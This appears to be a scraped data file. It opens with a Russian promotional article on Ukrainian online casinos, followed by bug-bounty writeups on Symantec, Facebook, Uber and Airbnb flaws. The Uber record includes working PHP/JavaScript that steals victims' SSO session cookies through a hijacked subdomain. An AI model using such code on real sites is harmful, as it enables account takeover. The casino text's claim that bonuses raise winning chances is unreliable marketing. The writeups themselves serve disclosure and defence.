предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://artkond.com/2018/10/10/symantec-authentication-bypass/", "title": "Symantec Messaging Gateway authentication bypass", "friendly_explanation": "This is a bug bounty writeup from https://artkond.com/2018/10/10/symantec-authentication-bypass/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSymantec Messaging Gateway authentication bypass Symantec Messaging Gateway authentication bypass | Artem Kondratenko Artem Kondratenko Twitter GitHub Archives Symantec Messaging Gateway authentication bypass Oct 10, 2018 When conducting security assessments sometimes there is no quick way past external perimeter of the customer’s network. As a last resort option one may commit to an extensive research of the few software appliances the client has exposed. This approach will often yield results, as it was the case with Symantec Messaging Gateway. Like in most login interfaces a password reset feature is present. “Forgot password” link appears after unsuccessful login attempt. The username is prompted afterwards. What happens under the hood is that SMG creates a password reset link. It puts an encrypted token in the link in order to make sure that the password is reset by the genuine owner of the account. That’s where the vulnerability is present. The string format of the token before encryption is “username:password”. Sounds fair enough as this enables SMG to check the token against a valid user password. Incidentally, when we tried “admin:” for a token, the system behaved in an unusual way. It generated a valid administrator session! Of course the token is encrypted, so how do we get the key? Luckily there has been a previous research for a similar bug in Symantec Gateway. Philip Pettersson found an authentication bypass that encrypted a parameter in a similar manner. He talks about a hardcoded key: Fortunately, the encryption is just PBEWithMD5AndDES using a static password, conveniently included in the code itself. I won't include the encryption password or a fully encrypted notify string in this post. Indeed, the key is static across SMG installations. We won’t disclose the key in this post. If one encrypts the following string - “admin:” and passes it as a value for GET parameter “authorization” he will receive a valid admin session. Example request: GET /brightmail/action2.do?method=passwordReset&authorization=<..>%3d HTTP/1.1 Host: 192.168.17.15 Connection: close Cache-Control: max-age=0 Origin: https://192.168.17.15 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Expected response: HTTP/1.1 302 Found Server: Apache-Coyote/1.1 Cache-Control: no-store,no-cache Pragma: no-cache Expires: Thu, 01 Jan 1970 00:00:00 GMT X-Frame-Options: SAMEORIGIN Set-Cookie: JSESSIONID=97B8786DB8CC163EB2A4C595D1028E1D; Path=/brightmail; Secure; HttpOnly Location: /brightmail/viewWelcome.do?userID=1 Content-Type: text/html;charset=UTF-8 Content-Length: 0 Connection: close Surely enough the cookie generated is a valid administrator session: To our knowledge the vulnerability is only present if the password reset feature is enabled in the appliance. At the time of testing the vulnerable version was 10.6.5. Symantec has released an advisory for this issue: https://support.symantec.com/en_US/article.SYMSA1461.html Disclosure timeline Vendor contacted - 11/07/2018 Vendor assigned Tracking ID - 11/07/2018 Vendor published vulnerability advisory, patched software versions released - 12/09/2018 We would like to thank Symantec for their prompt response and professionalism in dealing with the vulnerability. © Artem Kondratenko - Powered by Jekyll & whiteglass - Subscribe via RSS"}
{"source_url": "https://medium.com/@kankrale.rahul/dos-on-facebook-android-app-using-65530-characters-of-zero-width-no-break-space-db41ca8ded89", "title": "DoS on Facebook Android app using 65530 characters of ZERO WIDTH NO-BREAK SPACE. | by Rahul Kankrale | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@kankrale.rahul/dos-on-facebook-android-app-using-65530-characters-of-zero-width-no-break-space-db41ca8ded89. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDoS on Facebook Android app using 65530 characters of ZERO WIDTH NO-BREAK SPACE. | by Rahul Kankrale | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Rahul Kankrale 1 min read · Oct 25, 2018 -- Listen Share DoS on Facebook Android app using 65530 characters of ZERO WIDTH NO-BREAK SPACE. Step to reproduce: copy content of https://pastebin.com/0tpucbuv Open facebook.com in Mozilla, Create a new note, give title and paste the copied content in body of note and publish the note. Visit created note on facebook’s android app, App will goes in infinity loop and user have to close app. Proof of concept: https://youtu.be/FepNtq2MKus Status of Vulnerability: Fixed with comment (fb consider DoS attacks in scope as long as they are persistent. (e.g. would require a user to uninstall an app or break a complete functionality)). Thanks Rahulkankrale Android Facebook Bugbounty Infosec -- -- Written by Rahul Kankrale 177 followers · 7 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.takemyhand.xyz/2018/06/authentication-bypass-in-cisco-meraki.html", "title": "The page you're looking for could not be found (404)", "friendly_explanation": "This is a bug bounty writeup from https://blog.takemyhand.xyz/2018/06/authentication-bypass-in-cisco-meraki.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe page you're looking for could not be found (404) 404 The page you're looking for could not be found. The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it. Make sure the address is correct and that the page hasn't moved. Please contact your GitLab administrator if you think this is a mistake. Go back"}
{"source_url": "https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/", "title": "Authentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen", "friendly_explanation": "This is a bug bounty writeup from https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 6 Authentication bypass on Uber’s Single Sign-On via subdomain takeover Posted on June 25, 2017 by Arne Swinnen TL;DR: Uber was vulnerable to subdomain takeover on saostatic.uber.com via Amazon CloudFront CDN. Moreover, Uber’s recently deployed Single Sign-On (SSO) system at auth.uber.com, which is based on shared cookies between all *.uber.com subdomains, was found vulnerable to session cookie theft by any compromised *.uber.com subdomain. Therefore, the impact of the subdomain takeover could be increased to Authentication Bypass of Uber’s full SSO system, yielding access to all *.uber.com subdomains protected by it (e.g. vault.uber.com, partners.uber.com, riders.uber.com, etc). Uber resolved the subdomain takeover vulnerability and granted a $5.000 bounty for the two combined issues. Single Sign-On security revisited Generally, SSO systems are (variations of) any of the following three types, in order of popularity: OAuth : Security is mainly based on whitelisted callback URLs of service providers configured at the identity providers, and CSRF protection via the “state” parameter. Flaws are often via open redirect chains, e.g. Authentication bypass on Airbnb via OAuth tokens theft. SAML & friends : Security is based on XML messages signed with pre-exchanged cryptographic keys between service and identity providers. Flaws are often XML Signature bypasses, e.g. OneLogin authentication bypass on WordPress sites that bit Uber before. Shared (session) cookies between subdomains : Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaws are thus often RCE, debug logs exposure, subdomain takeover and friends on subdomains, e.g. Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover I personally believe that the first two in this list have had many problems in the past, but have improved lately in terms of security. The latter SSO based on shared session cookies between subdomains is more a technology from the past, before the former two even existed. By design, it enforces that anything that wants to leverage the SSO system to be a subdomain of the same TLD as where the SSO system is based. Since the security of the SSO system is based on the integrity of the subdomains (see aforementioned report and the Uber case below), this is quite an ironic situation. By design, it encourages to increase the attack surface enormously. Uber case Uber used OAuth as an SSO system for *.uber.com subdomains in the past, as can be seen from this recent public disclosure report by @ngalog : [Uber 8k Bug] Login CSRF + Open Redirect = Account Takeover . However recently, they’ve changed (reverted?) to a SSO system based on shared session cookies among subdomains of *.uber.com. If you now browse to any uber.com subdomain that requires authentication (e.g. central, partners, riders, vault, developer, …), you get redirected to auth.uber.com instead. Once you’ve logged in there and you visit another subdomain, you’re logged in there transparently via the SSO system at auth.uber.com, which issues temporary session cookies for every *.uber.com subdomain after being logged in once. A vulnerability was identified in this SSO system that allows any compromised subdomain on *.uber.com to transparently issue and steal valid session cookies issued for *any* uber.com subdomain by auth.uber.com, as long as the victim had already authenticated once to the SSO. Uber did have some countermeasures in place to prevent this, but these were bypassed and reported together with the subdomain takeover for increased impact. Any compromised *.uber.com subdomain could be used to perform the same attack, although Uber explicitly mentioned several *.uber.com subdomains as out of scope in their bug bounty program policy at the time of reporting (e.g. *.dev.uber.com, *.et.uber.com, drive.uber.com, etc). Subdomain takeover Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN via a DNS CNAME, but the hostname was not registered there anymore (dangling pointer). This allowed me to fully takeover this domain, highly similar to Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront by Frans Rosén . I effectively took over the subdomain as a Proof of Concept and hosted a simple HTML file as proof here: Authentication bypass In Uber’s SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com (“domain=uber.com” cookie attribute) to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, central.uber.com, vault.uber.com, developer.uber.com, and many more). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication to ensure that the window for theft is small, as can be seen in the below Uber SSO Login diagram: The precious shared session cookie “_csid” can thus only be stolen between steps 9-12, which is a very short period (automatic browser redirects). Although not impossible to exploit (see Jack Whitton’s awesome CSP trick to block certain cookies from being sent to certain domains, coincidentally also on Uber’s bug bounty program ), a more convenient flaw was identified that allows the shared session cookie to remain alive after step 12 in the browser’s cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie “_csid” from auth.uber.com, it is simply ignored and remains usable. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to replay step 3 in the above diagram as step 13 and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie: So once an attacker gets his/her hands on the victim’s “_csid” shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued “_csid” cookie value in step 9 to be logged in as the victim, right? Wrong. Uber had another surpising countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login diagram: The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can’t steal these values from the victim’s browser, but only the “_csid” shared session cookie, this means game over, right? Unfortunately, wrong. An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL generated by https://riders.uber.com in their own browser in step 3 to the victim’s browser to generate & steal the “_csid” shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the “_csid” temporary session token for the attacker’s login scenario in a separate browser, but this works flawlessly (e.g. no IP-based checks between steps were encountered). This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above diagram): Proof of concept A PoC says more than a thousand diagrams. In the PoC steps sent to Uber & showcased in the video below, the assumption is made that https://saostatic.uber.com is actually serving a valid SSL certificate in the victim’s browser, which was not the case. However, it could’ve easily been generated with Let’s Encrypt . Open the victim’s browser & browse to https://riders.uber.com. After being redirected to https://auth.uber.com, login with the victim’s credentials so you end up on https://riders.uber.com trips dashboard again. Open a second browser tab in the victim’s browser and browse to https://saostatic.uber.com/prepareuberattack.php. Accept any certificate warnings that you may receive here – again, we’re only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, “Cookie: ” string and a “Set-Cookie: ” strings underneath each other. This is all info gathered under the hood by the attacker’s webserver that is required to login as the victim now – everything has been stolen automagically. Open the separate attacker’s browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the “Cookie: …” string displayed on prepareuberattack.php and paste it into the request headers. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the “Set-Cookie: ” lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are permanently injected in the attacker’s browser. You are now logged in as the victim in the attacker’s browser. In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim’s browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the resulting page, but store this on the server-side, ready to be abused in a stealthy fashion. Although it’s a lengthy explanation, the PoC video showcases how quick & effective exploitation by an attacker can be. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is provided below. This was written quick & dirty for PoC purposes, but it did the job: prepareuberattack.php PHP <html> <body> <script> <?php function HandleHeaderLine( $curl, $header_line ) { preg_match(\"/state=([^;]*);/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var cookiestate = '\" . $matches[1] . \"';\\n\"); } preg_match(\"/Location: (.*)/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var loc = '\" . trim($matches[1]) . \"';\\n\"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, \"HandleHeaderLine\"); $page = curl_exec($c); ?> var csrf = loc.substring(loc.lastIndexOf(\"=\")+1); var img = document.createElement(\"IMG\"); img.onerror = function () { var iframe = document.createElement(\"iframe\"); iframe.setAttribute(\"src\",\"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent(cookiestate) + \"&csrftoken=\" + csrf); iframe.setAttribute(\"width\", \"100%\"); iframe.setAttribute(\"height\", \"10000\"); document.body.appendChild(iframe); } img.src=loc; </script> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < body > <script> < ? php function HandleHeaderLine ( $ curl , $ header _ line ) { preg_match ( \"/state=([^;]*);/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var cookiestate = '\" . $ matches [ 1 ] . \"';\\n\" ) ; } preg_match ( \"/Location: (.*)/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var loc = '\" . trim ( $ matches [ 1 ] ) . \"';\\n\" ) ; } return strlen ( $ header_line ) ; } $ c = curl_init ( 'https://riders.uber.com' ) ; curl_setopt ( $ c , CURLOPT_VERBOSE , 1 ) ; curl_setopt ( $ c , CURLOPT_RETURNTRANSFER , 1 ) ; curl_setopt ( $ c , CURLOPT_HEADERFUNCTION , \"HandleHeaderLine\" ) ; $ page = curl_exec ( $ c ) ; ? > var csrf = loc . substring ( loc . lastIndexOf ( \"=\" ) + 1 ) ; var img = document . createElement ( \"IMG\" ) ; img . onerror = function ( ) { var iframe = document . createElement ( \"iframe\" ) ; iframe . setAttribute ( \"src\" , \"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent ( cookiestate ) + \"&csrftoken=\" + csrf ) ; iframe . setAttribute ( \"width\" , \"100%\" ) ; iframe . setAttribute ( \"height\" , \"10000\" ) ; document . body . appendChild ( iframe ) ; } img . src = loc ; </script> < / body > < / html > uberattack.php PHP <html> <body> <?php $cookiestring = \"state=\" . $_GET[\"cookiestate\"] . \"; \"; $interestincookies = array(\"_udid\", \"_csid\", \"sid\"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . \"=\" . str_replace(' ', '+', $value) . \"; \"; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace(' ', '+', $value) . \";</br>\"; } } print \"Url: \" . 'https://riders.uber.com/?state=' . urlencode($_GET[\"csrftoken\"]) . \"<br /><br />\"; print \"Cookie: \" . $cookiestring . \"<br />\"; print \"<br />\" . $cookiestringset . \"<br />\"; ?> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 < html > < body > <?php $cookiestring = \"state=\" . $_GET [ \"cookiestate\" ] . \"; \" ; $interestincookies = array ( \"_udid\" , \"_csid\" , \"sid\" ) ; foreach ( $_COOKIE as $name = > $value ) { if ( in_array ( $name , $interestincookies ) ) { $cookiestring = $cookiestring . $name . \"=\" . str_replace ( ' ' , '+' , $value ) . \"; \" ; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace ( ' ' , '+' , $value ) . \";</br>\" ; } } print \"Url: \" . 'https://riders.uber.com/?state=' . urlencode ( $_GET [ \"csrftoken\" ] ) . \"<br /><br />\" ; print \"Cookie: \" . $cookiestring . \"<br />\" ; print \"<br />\" . $cookiestringset . \"<br />\" ; ?> < / body > < / html > The first file can be hosted anywhere, the second file must be hosted on the hijacked subdomain (since it reads & reflects the incoming session cookies). By simply changing “riders.uber.com” to any other subdomain of uber.com in these two PHP files, an attacker could generate valid sessions for these subdomains on behalf of the victim, e.g. vault.uber.com, partners.uber.com, developer.uber.com, … Recommendations The recommendations provided to Uber were twofold: Resolve the subdomain takeover of saostatic.uber.com by removing the dangling CNAME to AWS CloudFront CDN. Resolve the Authentication Bypass issue by any of the following, in order of priority: Revert the SSO system back to OAuth 2, since this does not have the side-effect of actually encouraging a large attack surface like the current shared session SSO system. Or, implement an IP address check: Store a user’s external IP address when issuing a shared “_csid” session cookie on auth.uber.com (identity provider) and verify that users presenting this shared session cookie to service providers on *.uber.com have the same external IP address, to prevent relay attacks like the one described above. There is a residual risk here, namely when the attacker has the same external IP address as its victim (e.g. on the same corporate network/wireless access point/…). Or, accept the inherent risk and include all *.uber.com subdomains in your bug bounty program scope, since they have the potential to fully compromise the SSO system, including the high-value targets vault.uber.com, partners.uber.com and riders.uber.com Ultimately, Uber removed the dangling CNAME and decided to implement the IP address check to decrease the exposed risk through their current cookie based SSO system. They thus opted to accept the residual risk involved. Timeline 07/04/2017: Submitted bug report to Uber 11/04/2017: Triaged by Uber 14/04/2017: $500 minimum bounty awarded 06/06/2017: Pinged Uber about the report, since I still owned saostatic.uber.com at this point 06/06/2017: Response from Uber that this report fell through the cracks, starting mitigations now 07/06/2017: DNS CNAME record for saostatic.uber.com removed, report marked as closed 14/06/2017: Extra $4.500 bounty awarded 07/07/2017: IP address check deployed by Uber and confirmed after retest 11/07/2017: Permission granted to publish blogpost by Uber Arne Swinnen Belgian. IT Security. Bug Bounty Hunter. 6 Comments Reply July 13, 2017 Eveez Hi nice find. BTW, did you use sublist3r to find that subdomain saostatic.uber.com? thanks 😉 Reply July 13, 2017 Arne Swinnen No comment 😉 Reply July 26, 2017 Gopal Singh you are genious! Reply February 4, 2019 Paulo Choupina I just finished reading this and i could understand it all. First time I read a write up and can actually understand it all. I will be folowing your work from now on. Good job! Reply March 1, 2022 Jack How are you creating these flow diagrams? Reply March 7, 2022 Arne Swinnen Draw.io 🙂 Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Δ © 2025 Arne Swinnen. All rights reserved. Hiero by aThemes"}
{"source_url": "https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/", "title": "Authentication bypass on Airbnb via OAuth tokens theft – Arne Swinnen", "friendly_explanation": "This is a bug bounty writeup from https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Airbnb via OAuth tokens theft – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 5 Authentication bypass on Airbnb via OAuth tokens theft Posted on June 22, 2017 by Arne Swinnen TL;DR: Login CSRF in combination with an HTTP Referer header-based open redirect in Airbnb’s OAuth login flow, could be abused to steal OAuth access tokens of all Airbnb identity providers and eventually authenticate as the victim on Airbnb’s website and mobile application. This attack did not rely on a specific OAuth identity provider app configuration flaw (e.g. wildcards in whitelisted redirect_uri URLs), which made it generic for all Airbnb’s identity providers (Facebook & Google at the time of reporting). Airbnb fixed both the login CSRF and open redirect issues and awarded a $5.000 bounty back in the summer of 2016. OAuth token theft revisited Most (if not all) publicly available examples of OAuth token theft attacks rely on modification of the redirect_uri parameter value in the call to an identity provider in order to steal either an authorization code or an access_token from an authenticated victim. This requires a non-exact match of redirect_uri configured values (e.g. wildcards for subdomains or paths in the URL) for the service provider’s application on the identity provider’s end. Although the attacks are similar, their associated technique and impact is different: authorization code : Typically stolen via cross-domain leakage of the callback URL, which contains the precious authorization “code” GET parameter value that is appended to the redirect_uri URL by the identity provider upon redirection. A common example is theft via HTTP Referer header when loading cross-domain resources . Impact is typically authentication bypass on the service provider’s end, as the stolen “code” can be used to login as the victim there. access_token: Typically stolen via a cross-domain open redirect chain, since the access_token is communicated back via an URL’s location fragment (aka location.hash) by the identity provider, which survives cross-domain server-side redirects in all modern browsers. Impact is typically access to the victim’s identity provider with permissions of the service provider’s application there. Here’s a great example of a vulnerable Slack application on Facebook by Frans Rosén (golden oldie) . However, I made some new observations during investigation of Airbnb’s OAuth setup, namely: Redirect_uri modification to steal authorization codes is no more . All major identity providers have implemented an extra server-side check when service providers attempt to exchange an authorization code for an access token, which ensures the redirect_uri has not been tampered with earlier ( Facebook , Google ). This is a good thing. Major identity providers are not allowing wildcards in whitelisted redirect_uri lists anymore by default . They are a dying breed, mainly legacy applications are still vulnerable. This is a good thing. Theft of access_token can also result in authentication bypass . Quite often, websites of service providers use the “authorization code” flow to 